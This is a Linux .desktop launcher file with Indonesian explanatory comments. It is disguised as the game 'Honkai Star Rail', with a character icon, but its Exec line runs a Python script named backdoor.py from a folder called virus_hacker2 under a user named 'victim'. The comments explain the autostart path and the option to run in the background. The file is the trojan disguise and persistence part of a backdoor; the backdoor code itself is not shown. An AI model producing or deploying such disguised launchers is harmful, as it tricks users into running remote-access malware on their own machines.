[Desktop Entry]

# NAMA APLIKASI YANG AKAN DITAMPILKAN DI MENU ATAU SYSTEM
# INI HANYA UNTUK IDENTITAS, TIDAK MEMPENGARUHI EKSEKUSI
Name=Honkai Star Rail

# PERINTAH YANG AKAN DIJALANKAN
# FORMAT: <PROGRAM> <PATH SCRIPT>
# DI SINI MENGGUNAKAN PYTHON3 UNTUK MENJALANKAN FILE koneksi.py
# PATH HARUS ABSOLUTE (LENGKAP) AGAR TIDAK ERROR SAAT AUTOSTART
Exec=python3 /home/victim/Dokumen/virus_hacker2/backdoor.py

# ICON YANG DIGUNAKAN UNTUK APLIKASI
# HANYA UNTUK TAMPILAN VISUAL DI MENU / DESKTOP
# JIKA PATH SALAH → BIASANYA TIDAK ERROR, HANYA ICON TIDAK MUNCUL
Icon=/home/victim/Dokumen/virus_hacker2/silverwolf_lvl999.png

# MENENTUKAN TIPE FILE INI ADALAH APLIKASI
# WAJIB ADA AGAR FILE .DESKTOP DIKENALI SYSTEM
Type=Application

# MENENTUKAN APAKAH TERMINAL AKAN TERBUKA SAAT DIJALANKAN
# true  → TERMINAL MUNCUL (BAGUS UNTUK DEBUG)
# false → BERJALAN DI BACKGROUND (TANPA TERMINAL)
Terminal=true
